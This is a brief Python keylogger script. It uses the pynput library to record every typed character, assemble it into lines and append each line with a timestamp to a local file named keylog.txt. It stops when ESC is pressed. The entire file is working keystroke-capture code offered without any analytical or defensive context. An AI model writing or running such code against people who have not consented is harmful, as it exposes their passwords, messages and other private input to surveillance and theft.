from pynput import keyboard
from datetime import datetime

# I'll optimize it
timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
with open('keylog.txt', 'a') as f:
    f.write(f"\n\n------Recording Started {timestamp}------\n")

current_sentence = ""

def on_press(key):
    global current_sentence
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open('keylog.txt', 'a') as f:
            if hasattr(key, 'char') and key.char:
                current_sentence += key.char
            elif key == keyboard.Key.space:
                current_sentence += " "
            elif key == keyboard.Key.enter:
                f.write(f"[{timestamp}] {current_sentence}\n")
                current_sentence = ""
            f.flush()
    except Exception:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
